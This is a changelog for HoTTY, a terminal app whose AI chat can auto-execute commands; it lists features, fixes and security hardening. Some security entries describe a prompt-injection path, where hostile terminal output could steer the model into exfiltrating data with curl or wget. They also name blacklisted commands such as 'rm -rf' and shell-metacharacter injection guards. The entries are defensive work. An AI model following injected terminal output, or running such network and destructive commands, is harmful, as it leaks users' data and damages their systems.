This beta redesigns the terminal **"Ask AI"** flow — replacing the customizable Ask AI Commands with a quick, free-form inline question box — and hardens the AI auto-execution and File Server security model.

### Breaking Changes

- **Customizable "Ask AI Commands" have been removed.** The preset right-click commands (such as "What is this?", "Research root cause" and "Fix this") and the **Settings → AI → Ask AI Commands** editor — where you could add, reorder and template your own `{selection}` prompts — are gone, replaced by the free-form inline box below. Any custom Ask AI commands you had configured will no longer appear, and the terminal right-click no longer shows a command list.

### New Features

- **Ask the AI about terminal output with a right-click.** Select text in a terminal, right-click the selection, and type your question in the inline **"Ask AI"** box that appears — press **Enter** to send (**Shift + Enter** for a new line). HoTTY opens or focuses the AI Chat pane and sends your question together with the selected text. (Click a Terminal Marker first to select a whole output block.) This replaces the previous modal-with-preset-commands flow with a faster, free-form question.

### Security

- **AI auto-execution no longer treats network tools as safe.** `curl`, `wget` and `nmap` have been removed from the default auto-execute Whitelist, closing a data-exfiltration path: a plain `GET` could otherwise send terminal or selected data to a remote host without tripping the write-method guard (terminal output from a hostile host is fed to the model, a prompt-injection surface). Whitelist phrase matching is now anchored to the start of a command, so a benign whitelisted phrase can no longer auto-allow an unrelated command that merely contains it.
- **File Server: upload-path symlink escape closed.** The built-in TFTP/SFTP server's write path now resolves and rejects a final-component symlink (including a dangling one), so a symlink planted inside the served folder can no longer redirect an upload outside it.

## v2.0.7

The v2.0.7 stable release, consolidating the v2.0.7 beta series. It brings three major additions — a fully multilingual interface, a built-in **File Server** for pushing firmware to network gear, and an embedded **Web Browser** for device web admin UIs — together with supply-chain hardening of the build pipeline and a round of reliability fixes (serial typing latency, session logging, and SSH host-key handling).

### New Features

- **The HoTTY interface is now available in 8 languages.** A new **Display language** selector in **Settings → General** switches the entire UI — menus, tabs, dialogs, settings, the AI chat panel, and in-app help — between **English, 日本語 (Japanese), 简体中文 (Simplified Chinese), 繁體中文 (Traditional Chinese), 한국어 (Korean), Русский (Russian), Español (Spanish), and Français (French)**. The change applies instantly with no restart, and your choice is remembered across launches. English remains the default, so existing installs are unaffected until you choose another language. (The AI's response language is configured separately in the AI chat panel and is unchanged by this setting.)
- **Built-in File Server (TFTP + SFTP) for firmware uploads.** A new **File Server** pane (tab bar → Features → "File Server") runs an in-app **TFTP** server (UDP, default port 69 — the classic Cisco IOS `copy tftp: flash:` method) and an **SFTP** server (SSH-based, default port 2222, username/password authentication) over a folder you select, so routers, switches and other LAN devices can download or upload firmware/config images directly. Serving is read-only by default (toggle **Allow uploads** per protocol for device→PC transfers); every request is confined to the chosen folder (path traversal, symlink escapes and sensitive system-path access are blocked); the SFTP host key is generated automatically and stored encrypted; and a live transfer log shows each client, file and direction. If **Windows Firewall** is blocking inbound connections, the pane says so and offers a one-click **Allow through firewall** (requires administrator). The server runs only while its tab is open — closing the tab stops it and releases its ports. The feature can be turned off in **Settings → Features**.
- **Embedded Web Browser for device web admin UIs.** Open web pages inside HoTTY in an embedded browser (Microsoft Edge WebView2) — ideal for the web admin UIs of routers, switches, iLO/iDRAC and other network gear, side by side with your terminals. Launch it from the **New Session** dialog's new **🌐 Web** tab, with either a blank tab or a saved bookmark. The pane has Back / Forward / Reload / Stop and an address bar that navigates to a typed URL or **runs a web search** for free text. Organize sites in a **folder tree of bookmarks** — add, rename, delete and drag to reorder — and open a saved bookmark straight from the toolbar's bookmarks button without leaving the browser; the **★** button files the current page into a folder you pick. Login sessions persist across restarts and the browser can **save and autofill passwords**, kept in HoTTY's own encrypted profile (separate from your system Edge/Chrome). The browsed page is sandboxed and cannot reach HoTTY's internals. The whole feature can be turned off in **Settings → Features**.

### Improvements

- **Richer tab right-click menus.** Right-clicking a tab now offers actions tailored to that tab: **Watch with AI** / **Stop AI Watch** on a terminal session, **Save to Host Tree…** on an SSH/Telnet session, and **Add Bookmark…** on a Web Browser tab. When bookmarking a page, the destination folder is chosen with an expandable tree instead of a flat drop-down.

### Bug Fixes

- **Serial connections no longer lag while you type.** On a serial session, the read and write paths shared a single internal lock, so a keystroke could be held up waiting for the current read cycle to finish before being sent — adding up to ~100 ms of latency per character on an idle line. Reading and writing now use independent handles, so what you type is echoed without the stall.
- **Session logging now fails loudly instead of silently truncating.** If writing to a session log file failed mid-session (for example, the disk filled up or the log folder became unavailable), the error was silently ignored and the transcript was quietly cut short. Such a failure is now reported and logging for that session is stopped, so a log file is never left silently incomplete. In the unlikely event of a filename collision that couldn't be resolved, HoTTY now picks a unique name rather than risk overwriting an existing log.
- **Accepting a changed SSH host key is now recorded atomically.** When you accept and remember a host whose key has changed (on a direct or jump-host connection), the old and new entries are written in a single update. Previously there was a brief window in which a second, simultaneous connection to the same host could see the key as missing and prompt you again unnecessarily.
- **Fixed an event-listener leak in the Ping Monitor pane.** Repeatedly opening and closing the Ping Monitor pane could leave stale background event subscriptions behind; they are now always cleaned up when the pane closes.

### Security

- **Dependency supply-chain hardening.** Builds now install strictly from verified lockfiles with cryptographic integrity checking, the public package registries are pinned (guarding against dependency-confusion swaps), and dependency updates are held for a multi-day cooldown before adoption — so a maliciously published version is not pulled in before it is detected and removed. Every release, and every push via CI, is now gated on npm registry-signature verification (`npm audit signatures`) plus a `cargo-deny` audit covering security advisories, crate sources, and licenses.

## v2.0.7-beta7

Quality-of-life refinements to the **Web Browser** added in beta6: a bookmarks button in the toolbar, an address bar that falls back to web search, and richer tab right-click menus — plus a fix for dragging terminal tabs onto a browser pane.

### New Features

- **Open a saved bookmark without leaving the browser.** The Web Browser toolbar has a new bookmarks button that drops down your saved bookmark folder tree — click any entry to navigate there in the current pane (it shows "No bookmarks yet" until you save one). Previously, opening a bookmark meant going back to the **New Session → Web** tab.
- **The address bar now searches the web for non-URL text.** Typing something that isn't a web address — free text or a single bare word — runs a Google search instead of failing to navigate, matching the omnibox behavior of a normal browser. Host-like input (a domain, an IP address, `host:port`, or `localhost`) still navigates directly, and an explicit `http://` / `https://` address is unchanged.

### Improvements

- **Richer tab right-click menus.** Right-clicking a tab now offers actions tailored to that tab: **Watch with AI** / **Stop AI Watch** on a terminal session, **Save to Host Tree…** on an SSH/Telnet session, and **Add Bookmark…** on a Web Browser tab (the same as the toolbar ★). The browser's own right-click menu is also suppressed on tabs, so only HoTTY's menu appears.
- **A folder tree when bookmarking a page.** The Add Bookmark dialog now picks the destination folder with an expandable tree instead of a flat drop-down, making it easier to file a page into a nested folder.

### Bug Fixes

- **Dragging a terminal tab onto a Web Browser pane now works.** The browser's embedded native view sits above the page and was swallowing drag-and-drop events, so dropping a terminal onto a browser pane's grid cell did nothing. The view is now hidden for the duration of a tab drag, so the drop lands on the cell underneath as expected.

## v2.0.7-beta6

A built-in **Web Browser** for opening network-device web admin UIs (and any site) right inside HoTTY — launched from the New Session dialog, with folder-organized bookmarks and saved logins.

### New Features

- **Web Browser pane.** Open web pages inside HoTTY in an embedded browser (Microsoft Edge WebView2) — ideal for the web admin UIs of routers, switches, iLO/iDRAC and other network gear, side by side with your terminals. Launch it from the **New Session** dialog's new **🌐 Web** tab: choose **🆕 New Web Browser** for a blank tab, or double-click a saved bookmark. The pane has Back / Forward / Reload / Stop and an address bar (only `http://` and `https://` are allowed; an address typed without a scheme defaults to `http://`). Login sessions persist across restarts, and the browser can **save and autofill passwords** — kept in HoTTY's own encrypted browser profile, separate from your system Edge/Chrome. The browsed page is sandboxed and cannot reach HoTTY's internals. The whole feature can be turned off in **Settings → Features**.
- **Web bookmarks.** Organize sites in a folder tree under the New Session **Web** tab — add, rename, delete, and drag to reorder — then click a bookmark to open it in a new browser pane. While browsing, the **★** button in the toolbar saves the current page into a folder you choose. Bookmarks are stored locally and contain no credentials.

## v2.0.7-beta5

A maintenance release of bug fixes found in a codebase-wide review — most noticeably, serial connections now echo your typing without the occasional lag.

### Bug Fixes

- **Serial connections no longer lag while you type.** On a serial session, the read and write paths shared a single internal lock, so a keystroke could be held up waiting for the current read cycle to finish before being sent — adding up to ~100 ms of latency per character on an idle line. Reading and writing now use independent handles, so what you type is echoed without the stall.
- **Session logging now fails loudly instead of silently truncating.** If writing to a session log file failed mid-session (for example, the disk filled up or the log folder became unavailable), the error was silently ignored and the transcript was quietly cut short. Such a failure is now reported and logging for that session is stopped, so a log file is never left silently incomplete. In the unlikely event of a filename collision that couldn't be resolved, HoTTY now picks a unique name rather than risk overwriting an existing log.
- **Fixed an event-listener leak in the File Server and Ping Monitor panes.** Repeatedly opening and closing these panes could leave stale background event subscriptions behind; they are now always cleaned up when the pane closes.
- **Accepting a changed SSH host key is now recorded atomically.** When you accept and remember a host whose key has changed (on a direct or jump-host connection), the old and new entries are written in a single update. Previously there was a brief window in which a second, simultaneous connection to the same host could see the key as missing and prompt you again unnecessarily.

## v2.0.7-beta4

A fix for the File Server added in beta3: it now stops when you close its tab.

### Bug Fixes

- **The File Server now stops when its tab is closed.** Previously, closing a File Server tab left the TFTP and SFTP servers running in the background with their ports still bound (so a later restart on the same port could fail). The servers now shut down and release their ports as soon as the tab is closed — the File Server runs only while its tab is open.

## v2.0.7-beta3

A built-in **File Server** for pushing firmware and config images to network gear over the LAN — start a TFTP and/or SFTP server pointed at a folder you choose, and a Cisco-style device can `copy tftp:` / `copy scp:` straight from your machine.

### New Features

- **Built-in File Server (TFTP + SFTP) for firmware uploads.** A new **File Server** pane (tab bar → Features → "File Server") runs an in-app **TFTP** server (UDP, default port 69 — the classic Cisco IOS `copy tftp: flash:` method) and an **SFTP** server (SSH-based, default port 2222, username/password authentication) over a folder you select, so routers, switches and other LAN devices can download or upload firmware/config images directly. Serving is read-only by default (toggle **Allow uploads** per protocol for device→PC transfers); every request is confined to the chosen folder (path traversal, symlink escapes and sensitive system-path access are blocked); the SFTP host key is generated automatically and stored encrypted; and a live transfer log shows each client, file and direction. If **Windows Firewall** is blocking inbound connections, the pane says so and offers a one-click **Allow through firewall** (requires administrator). The feature can be turned off in **Settings → Features**.

## v2.0.7-beta2

HoTTY's interface is now multilingual. A new **Display language** selector in **Settings → General** switches the entire UI between eight languages, instantly and without a restart.

### New Features

- **The HoTTY interface is now available in 8 languages.** A new **Display language** selector in **Settings → General** switches the entire UI — menus, tabs, dialogs, settings, the AI chat panel, and in-app help — between **English, 日本語 (Japanese), 简体中文 (Simplified Chinese), 繁體中文 (Traditional Chinese), 한국어 (Korean), Русский (Russian), Español (Spanish), and Français (French)**. The change applies instantly with no restart, and your choice is remembered across launches. English remains the default, so existing installs are unaffected until you choose another language. (The AI's response language is configured separately in the AI chat panel and is unchanged by this setting.)

## v2.0.7-beta1

A security-focused beta that hardens HoTTY's dependency supply chain against the recent wave of compromised-package attacks. There are no changes to in-app behavior — this release strengthens the integrity of the build and dependency pipeline that produces the installer.

### Security

- **Dependency supply-chain hardening.** Builds now install strictly from verified lockfiles with cryptographic integrity checking, the public package registries are pinned (guarding against dependency-confusion swaps), and dependency updates are held for a multi-day cooldown before adoption — so a maliciously published version is not pulled in before it is detected and removed. Every release, and every push via CI, is now gated on npm registry-signature verification (`npm audit signatures`) plus a `cargo-deny` audit covering security advisories, crate sources, and licenses.

## v2.0.6

The v2.0.6 stable release, consolidating the v2.0.6 beta series. The headline is a new AI Chat command-safety model: auto-execution of AI-suggested commands is now gated by an explicit, fully user-managed **Whitelist / Blacklist + AI** classifier, and every command shows how it was judged. It also makes a leading `sleep` in an AI command wait client-side instead of on the device, and extends command-safety classification to Claude models on Vertex AI.

### New Features

- **Command safety is decided by a Whitelist, a Blacklist, and the AI — all configurable.** When Auto-execute is on, each AI-suggested command runs through three layers: the **Blacklist** is checked first (a match never auto-runs — a manual Run is still offered), the **Whitelist** auto-runs obvious read-only commands, and anything in between is sent to the AI, which judges whether the command changes configuration/state — only commands it judges read-only with enough confidence auto-run; everything else waits for confirmation. Both lists are fully editable in **Settings → AI → Command Execution**: a single word matches a base command (e.g. `docker` matches any docker command), and an entry with spaces matches as a substring (e.g. `rm -rf`, `git push`); each list has a **Reset to defaults** button. You can pick the strategy (Static / AI / **Hybrid**, the default) and the AI confidence threshold there too. This replaces the previous fixed safe-command list.
- **Every command shows how it was judged.** Each execute block now displays a per-command verdict — Whitelisted, AI verdict (with confidence), Blacklisted, or "needs confirmation" — with the reason, so an auto-run (or a withheld one) is never a mystery.
- **A leading `sleep` in an AI command now waits client-side instead of on the device.** When the AI issues a command that begins with `sleep N` (e.g. `sleep 120 && validate`), HoTTY now waits those N seconds locally and runs any chained command afterward, rather than sending the `sleep` to the terminal. Because a `sleep` on the device produces no output, the per-command **device-response idle timeout** would otherwise mis-fire during the wait and the AI would proceed prematurely; running the wait in HoTTY keeps the timing honest. The execute block shows a live **"⏳ Waiting Ns…"** countdown while the delay runs. Two new options live in **Settings → AI**: a toggle (on by default) and a **maximum delay** cap (default 900 s / 15 min — longer sleeps are clamped and noted; 0 = no cap).

### Improvements

- **Existing installs are migrated to the Hybrid classifier.** On upgrade, your previous custom safe commands are folded into the editable Whitelist, the Blacklist is seeded with sensible destructive-command defaults, and the strategy is set to Hybrid so AI judgment is available out of the box. You can change any of this in Settings.
- **Command-safety classification now works with Claude models on Vertex AI.** When the Hybrid / AI classifier sends a command to the model for an auto-execute verdict, Anthropic (Claude) models hosted on Vertex AI are now supported — previously only Google (Gemini) Vertex models could classify, and selecting a Claude-on-Vertex model made the classifier fall back to manual execution. Auto-execute-safe now behaves the same regardless of which Vertex model family you use.

## v2.0.6-beta2

A follow-up to beta1 that fixes how AI-issued `sleep` commands interact with the device-response timeout, and extends command-safety classification to Claude models on Vertex AI.

### New Features

- **A leading `sleep` in an AI command now waits client-side instead of on the device.** When the AI issues a command that begins with `sleep N` (e.g. `sleep 120 && validate`), HoTTY now waits those N seconds locally and runs any chained command afterward, rather than sending the `sleep` to the terminal. Because a `sleep` on the device produces no output, the per-command **device-response idle timeout** would otherwise mis-fire during the wait and the AI would proceed prematurely; running the wait in HoTTY keeps the timing honest. The execute block shows a live **"⏳ Waiting Ns…"** countdown while the delay runs. Two new options live in **Settings → AI**: a toggle (on by default) and a **maximum delay** cap (default 900 s / 15 min — longer sleeps are clamped and noted; 0 = no cap).

### Improvements

- **Command-safety classification now works with Claude models on Vertex AI.** When the Hybrid / AI classifier sends a command to the model for an auto-execute verdict, Anthropic (Claude) models hosted on Vertex AI are now supported — previously only Google (Gemini) Vertex models could classify, and selecting a Claude-on-Vertex model made the classifier fall back to manual execution. Auto-execute-safe now behaves the same regardless of which Vertex model family you use.

## v2.0.6-beta1

An AI Chat safety release: auto-execution of AI-suggested commands is now decided by an explicit, fully user-managed **Whitelist / Blacklist + AI** model, and every command shows how it was judged.

### New Features

- **Command safety is decided by a Whitelist, a Blacklist, and the AI — all configurable.** When Auto-execute is on, each AI-suggested command runs through three layers: the **Blacklist** is checked first (a match never auto-runs — a manual Run is still offered), the **Whitelist** auto-runs obvious read-only commands, and anything in between is sent to the AI, which judges whether the command changes configuration/state — only commands it judges read-only with enough confidence auto-run; everything else waits for confirmation. Both lists are fully editable in **Settings → AI → Command Execution**: a single word matches a base command (e.g. `docker` matches any docker command), and an entry with spaces matches as a substring (e.g. `rm -rf`, `git push`); each list has a **Reset to defaults** button. You can pick the strategy (Static / AI / **Hybrid**, the default) and the AI confidence threshold there too. This replaces the previous fixed safe-command list.
- **Every command shows how it was judged.** Each execute block now displays a per-command verdict — Whitelisted, AI verdict (with confidence), Blacklisted, or "needs confirmation" — with the reason, so an auto-run (or a withheld one) is never a mystery.

### Improvements

- **Existing installs are migrated to the Hybrid classifier.** On upgrade, your previous custom safe commands are folded into the editable Whitelist, the Blacklist is seeded with sensible destructive-command defaults, and the strategy is set to Hybrid so AI judgment is available out of the box. You can change any of this in Settings.

## v2.0.5

A small quality-of-life release: you can now move keyboard focus between panes without reaching for the mouse.

### New Features

- **Switch focus between panes from the keyboard.** `Ctrl+Tab` moves focus to the next pane and `Ctrl+Shift+Tab` to the previous one, cycling through every visible pane — grid cells first (in row-major order), then any visible sidebar panes. Previously the active pane could only be changed by clicking it. Because `Ctrl+Tab` cannot be encoded into the terminal byte stream, the shortcut never steals a keybinding from the shell, vim, tmux, or anything else running inside the pane.

## v2.0.4

A focused AI Chat release: the **Network Expert** persona now preps the device on its own. When such a chat is linked to a live terminal, HoTTY runs the persona's mandatory start-of-session protocol (identify the device, then disable paging) automatically — you no longer have to send a throwaway first message to get the session ready.

### New Features

- **Network Expert chats run their start-of-session protocol automatically.** When an AI Chat using the Network Expert persona is linked to a live terminal, HoTTY now kicks off the persona's mandatory prep — identify the device, then disable paging — on its own, so the response loop is ready before you ask anything (previously the protocol only ran once you sent a first message). The behavior is reconnect- and device-aware: switching the linked terminal to a *different* device first starts a fresh chat — clearing the old conversation and its backend history so the previous device's output can't bleed into the new context — and then re-runs the full prep, while a *reconnect to the same device* mid-conversation injects only a lightweight paging re-disable and keeps your conversation intact. A chat you have already typed into on a device HoTTY never managed is never hijacked.

## v2.0.3

The v2.0.3 stable release, consolidating the v2.0.3 beta series. Beyond the beta changes it adds **automatic re-linking of AI Chat tabs to a reconnected terminal**, clearer in-UI handling when a watched terminal has dropped, and a round of AI Chat streaming / auto-execute reliability fixes.

### New Features

- **AI Chat tabs re-link automatically to a reconnected terminal.** When a watched terminal disconnects, its AI Chat tab keeps a config-derived identity of the target (protocol + destination), and as soon as a terminal reconnects to that same target — a reconnect mints a brand-new session id — the orphaned tab re-links to it on its own, so the conversation keeps working without pressing **Watch** again. Re-linking happens only on an unambiguous match (exactly one reconnected session and one orphaned tab share the target identity); ambiguous same-target situations are left for you to resolve manually.

### Improvements

- **AI Chat shows when its linked terminal isn't connected.** The linked-terminal chip and each message's **Target:** label now turn amber and read "(disconnected)" while the watched session is dropped, reconnecting, or gone, with a tooltip explaining to reconnect the terminal and press **Watch** to re-link. Previously the link always looked healthy even when commands couldn't reach the terminal.
- **Pressing Watch after a reconnect relinks the current tab in place.** If the active tab still points at a dead session, toggling **Watch** on the reconnected terminal now relinks that tab (dropping the stale watch buffer) instead of opening a second tab still aimed at the dead session.
- **A dead or half-open SSH peer is now detected deterministically.** SSH keepalives are bounded by an explicit unanswered-probe limit, so a silently dropped or zombie connection surfaces as *disconnected* within a bounded window after it goes quiet instead of hanging — which is also what lets the UI and the AI Chat auto-rebind react to the drop.
- **`screen-length` is recognised as a read-only command** in Auto-execute-safe mode, so a paging-control line like `screen-length 0 temporary` on Huawei / H3C devices runs without manual confirmation.

### Bug Fixes

- **Running a command into a disconnected linked terminal no longer silently fails.** After an SSH drop and reconnect where the chat still looked linked, clicking **Run in Terminal** (or an auto-execute) sent the command to a session the backend no longer had and the error was swallowed — nothing ran and the AI waited indefinitely. The send is now guarded on both sides: a stale link suppresses auto-execute (leaving a manual **Run** button), and any attempt posts a clear "the linked terminal is not connected — reconnect and press Watch" result that the model can read.

- **AI Chat code blocks no longer overlap while a response streams.** A CSS rule forced every `<pre>` inside a streaming message to render inline, collapsing multi-line code blocks into overlapping text until the response finished (they self-corrected only once committed). Code blocks now stay block-level throughout streaming.
- **The execute-command block no longer garbles mid-stream.** While a response was still streaming, the ` ```execute ` block could render with corrupted, misaligned indentation: message parts were keyed by array position, so a given slot flipped between markdown (injected HTML) and execute (React children) content as more tokens arrived, leaving stale injected DOM. Parts now carry stable, kind-discriminated keys so React remounts cleanly on a flip, a trailing unclosed `execute` fence is recognised as a pending block mid-stream, and command lines no longer wrap.
- **AI Chat no longer hangs with the input locked after a stalled stream.** If a streamed response stalled after a chunk (a dropped completion signal or a hung provider), the 3-minute idle watchdog was being torn down and re-subscribed on every chunk — wiping the idle timer that chunk had just armed — so the timeout never fired and the chat stayed locked (only **Stop** recovered). The watchdog now subscribes once per pane, and a separate hard-cap timer cancels a stream that runs on endlessly without ever completing.
- **The AI per-command idle timeout now fires on a silent device.** A command whose device returned zero bytes (a dead or hung session, suppressed echo, or dropped connection) never tripped the "no response from device for N seconds" idle timeout and instead waited out the full 30-minute safety cap — exactly the silent-hang case the idle timeout exists for. The idle timeout no longer requires any output, so a silent device now times out promptly.
- **The first auto-executed command after a New chat is no longer suppressed.** Starting a **New chat** cleared the visible messages but kept the pane's auto-execute dedup guard and badge set. Because message indices restart at 0, the AI's first command in the new conversation regenerated the same key as the previous chat and was silently treated as a duplicate — it never reached the terminal and started no poll or idle timeout, yet a stale "Auto-executed" badge still showed. Both structures are now tracked per tab and reset when you start a New chat.

## v2.0.3-beta8

A GCP-pane release. Browsing your Compute Engine instances is now noticeably faster: discovery has been rebuilt on Google's REST APIs (Cloud Resource Manager + Compute `aggregatedList`) instead of spawning one `gcloud` subprocess per query — it fetches a single OAuth token per refresh and probes many projects concurrently, with an automatic fall back to the `gcloud` CLI if the REST path is unavailable. The pane also gains a **search box** to filter projects and instances as you type, and it now shows the **last-known list instantly on launch** while revalidating in the background. Two security hardening items round out the release: new host-tree (`.htree`) exports use the memory-hard **Argon2id** key-derivation function, and the `gcloud` argument guard now rejects the full set of shell metacharacters.

### New Features

- **Search box in the GCP pane.** A search field at the top of the GCP instances pane filters the list by project or instance name as you type. Matching is case-insensitive and spans both project names and instance names — a project stays visible if its own name matches or any of its instances do. A **×** button clears the query, and your last search text is remembered across sessions. The filter runs after the IAP-access gate, so it only ever surfaces instances you are allowed to connect to.

### Improvements

- **GCP projects and instances load instantly on launch.** The discovery snapshot (projects, instances, and IAP-access flags — no secrets) is now persisted to disk per user and reloaded on startup, so the pane shows your last-known list immediately instead of starting empty. If that snapshot is older than 10 minutes it is revalidated in the background (stale-while-revalidate), so you see data right away while it quietly refreshes. A fresh in-memory snapshot from a recent refresh is reused as-is and still requires an explicit **Refresh** to re-query.

### Performance

- **GCP discovery is substantially faster via Google's REST APIs.** Listing projects and instances and probing IAP / OS Login permissions previously spawned a separate `gcloud` (Python) subprocess for every call, which dominated refresh time for users with many projects. HoTTY now talks to the Cloud Resource Manager and Compute `aggregatedList` REST endpoints directly, fetching one OAuth access token per refresh (via `gcloud auth print-access-token`) and reusing it across every call, with the per-project work running at higher concurrency. Result ordering and the friendly error messages are identical to the old CLI path, and HoTTY automatically falls back to the `gcloud` CLI if the REST backend is unavailable.

### Security

- **New host-tree exports use Argon2id key derivation.** Encrypted `.htree` exports are portable, password-protected files, so their key-derivation strength directly governs offline brute-force resistance. New exports now derive their AES-256-GCM key with **Argon2id** (memory-hard: 64 MiB, 3 passes) instead of PBKDF2-HMAC-SHA256, and carry a format version so the scheme can evolve. Existing `.htree` files written by older builds still import unchanged — the previous PBKDF2 reader is retained solely for backward compatibility.
- **The `gcloud` argument guard now rejects all shell metacharacters.** The guard protecting the `gcloud.cmd` invocation (spawned via `cmd.exe`) previously rejected only the double-quote character. It now rejects the full BatBadBut set — `"`, `%`, `^`, `&`, `|`, `<`, `>`, and newlines — as defense-in-depth against argument / command injection through a `.cmd` batch file. Every GCP identifier reaching this path is already validated upstream, so this hardens a path with no known exploit. Follow-up to the argument-quoting guard added in beta4 and re-hardened in beta7.

## v2.0.3-beta7

A backend-and-frontend bug-fix release with two GCP IAP security follow-ups. The fixes span **connection reliability** (an SSH keepalive that never actually pinged, a Telnet socket leaked on disconnect, and GCP IAP key generation that failed for non-default OpenSSH installs), the **AI layer** (mid-stream / HTTP errors that corrupted chat history, Vertex AI failures mislabelled `API error 0`, and a Japanese-first-run language-selector bug), and several **credential / save-path correctness** issues (saved SSH key passphrases, edited passphrases served stale on reconnect, text-editor save ordering, and GCP instance action state). SSH disconnect is now immediate. The two security items extend the existing credential-environment scrubbing to the IAP tunnel's `gcloud` subprocess and harden the `gcloud` argument-quoting guard in release builds.

### Performance

- **SSH disconnect is now immediate.** Disconnecting an SSH session previously left the background reader task parked until a fixed drain timeout (~1.5 s) elapsed and it was force-aborted — the keepalive rework had removed the signal the reader used to wait on. The reader is now wired to a `CancellationToken` via `tokio::select!`, so `disconnect()` stops it at once and the teardown is race-free (the old `Notify`-based path had a lost-wakeup race). Closing or dropping an SSH tab no longer carries that tail latency.

### Bug Fixes

- **SSH keepalive now actually keeps idle sessions alive.** The keepalive task only ticked an internal timer and never sent anything on the wire, so idle SSH sessions were still dropped by the server even with a keepalive interval configured. HoTTY now uses russh's native `keepalive_interval`, which emits `keepalive@openssh.com` global requests — the same mechanism as OpenSSH's `ServerAliveInterval` — and the dead task was removed.
- **Telnet sessions no longer leak a socket on disconnect.** The Telnet disconnect path used a 200 ms timeout that logged "aborting" but never actually aborted the reader task, detaching it and leaking the underlying socket. It now matches the other protocols: wait up to 1500 ms, then `abort()` the handle.
- **AI provider errors no longer corrupt the chat history.** On a mid-stream failure or an HTTP error, HoTTY kept the unanswered user message and appended a partial/empty assistant turn (and emitted a duplicate "done"), corrupting the conversation for providers that require strict user/assistant alternation (Vertex AI, Anthropic) — the next message would then fail. All providers now share one policy: on a hard error the unanswered user message is dropped; on normal completion or cancellation the assistant turn is kept and closed cleanly.
- **Vertex AI errors now report the real HTTP status.** Vertex AI (and the Anthropic-on-Vertex path) reported every failure as `API error 0` because the response body was consumed before the status code was read. The status is now captured first, so the actual code appears in the error message.
- **AI chat response language fixed on Japanese first run.** The default response-language value `日本語` never matched the `Japanese` `<option>`, so the selector came up unselected on a Japanese first launch; and choosing `Auto` injected a literal "You MUST answer in Auto." line into the prompt. A shared `languageDirective()` helper now backs both the settings effect and the Ask-AI flow (English / Auto add no directive), the default is `Japanese`, and any stored `日本語` value is migrated.
- **Saved SSH key passphrases now work when connecting.** When dialing a saved host, the New Session dialog resolved the username and password from the decrypted credential cache but not the private-key passphrase, so an encrypted passphrase was handed to the backend verbatim and key authentication failed. All three credentials are now resolved together.
- **Editing a host's key passphrase is reflected on the next reconnect.** The decrypted-credential cache refreshed the username and password when you edited a saved host, but not the private-key passphrase, so a freshly-edited passphrase could be served stale on reconnect. The passphrase is now cached symmetrically with the other two credentials.
- **A failed text-editor save no longer mis-points the tab.** **Save** committed the tab's file path before the write completed, so if the write failed the tab was left pointing at a path that was never written. The path is now recorded only after the bytes land (matching **Save As**).
- **GCP instance actions no longer clobber each other's state.** Issuing overlapping start/stop actions on the same instance could let a superseded action's cleanup clear the successor's pending / live / error state. Tracker cleanup is now ownership-aware — only the current owner commits its snapshot and retracts state.
- **GCP IAP key generation no longer fails for non-default OpenSSH installs.** The `ssh-keygen.exe` lookup skipped the `PATH` scan on Windows (unlike the `ssh.exe` lookup), so an OpenSSH install outside the well-known location resolved `ssh.exe` but not `ssh-keygen.exe`, and key generation failed. Both now use the same `PATH`-aware executable finder.

### Security

- **GCP IAP tunnel: the `gcloud` subprocess no longer inherits credential-bearing environment variables.** The IAP-tunnel `gcloud` runner inherited the full, unscrubbed parent environment, while the other `gcloud` code path already cleared it and applied a sanitized allowlist. Both surfaces now share one policy (`env_clear()` + `sanitized_env()`), so the same credential carriers (API keys, tokens, `SSH_AUTH_SOCK`, session pointers, etc.) are filtered for every `gcloud` invocation. This extends the credential-environment scrubbing introduced in beta5 to the surface that had been missed.
- **GCP IAP: a `gcloud` command with a quote in its arguments is now rejected in all builds.** The guard against a `"` appearing in a `gcloud` argument vector previously only fired as a `debug_assert!` and then ran the mangled command anyway in release builds. It now hard-fails with an `InvalidConfig` error in every build profile. Follow-up to the argument-quoting guard added in beta4.

## v2.0.3-beta6

A host-tree-ergonomics release with two security follow-ups. The headline change closes a long-standing papercut: an **ad-hoc connection started from "New Connection" can now be saved to the host tree** without having to retype every field into the host-tree form. The save dialog presents the host-tree folders as a **selectable tree view** with **+ New Folder** built in, so you can pick a destination folder — or create one (nested if you like) — without leaving the dialog. A dedicated **🆕 New Connection** row at the top of the host tree replaces the previous "deselect the current host" step when you want to dial a fresh ad-hoc target. Two UNC-path security follow-ups (the ones missed in beta5's broader UNC sweep) round out the release.

### New Features

- **Save an ad-hoc session to the Host Tree from the tab.** Right-click any SSH or Telnet session tab and choose **Save to Host Tree…** to keep the connection for later. The save dialog shows your existing host-tree folders as a tree, with **(Root)** preselected at the top — click any folder to drop the new host there. The name field is pre-filled from the session's display name. SSH **private key path** and **passphrase** are persisted on the saved entry alongside username / password / jumpbox setup, so double-clicking the saved host later re-dials with the same auth setup. The right-click menu only appears for SSH and Telnet tabs (Serial / WSL / Local / GCP IAP are not target protocols for this flow).
- **Create folders directly inside the Save to Host Tree dialog.** The save dialog has a **+ New Folder** button below the folder tree. Click it, type a name, hit Enter, and a folder is created as a child of the currently-selected folder (or at the tree root if **(Root)** is selected). The new folder is highlighted and auto-becomes the destination, so you can save the host into it immediately. Repeat the flow to build a nested path (`Production / EU / DB` in three clicks) without ever leaving the dialog — previously you had to cancel out, switch to the host tree, build the folder there, and re-open the save flow.
- **🆕 New Connection row at the top of the Host Tree.** A dedicated row above the saved hosts starts a fresh ad-hoc connection — it clears the protocol form on the right of the **New Session** dialog so you can dial a one-off target without first deselecting a saved host. Clicking the row also clears the selection in the tree, so the form switches from "edit saved host" mode to "new connection" mode in one click. The previous workflow (open the dialog, then explicitly click an empty area of the tree to deselect) is gone.

### Improvements

- **Saved hosts appear in the dialog immediately, not after a restart.** Two unrelated `useHostManager()` callers (the Save to Host Tree dialog and the New Session host tree) each held their own copy of the tree state via independent `useState`. Saving a new host from the dialog wrote to `localStorage` and DPAPI-encrypted the entry, but the New Session dialog kept its stale in-memory copy and only refreshed when the whole app restarted. The hook now publishes tree updates through a small module-level subscriber, so every live `useHostManager()` instance receives the change synchronously and the new host is visible the next time the New Session dialog opens (or, if it's already open, immediately). The fix also covers the SSH private-key-passphrase field — it is now DPAPI-encrypted on disk alongside the password (`privateKeyPath` is left as plain text because it is a filesystem path, not a secret).

### Security

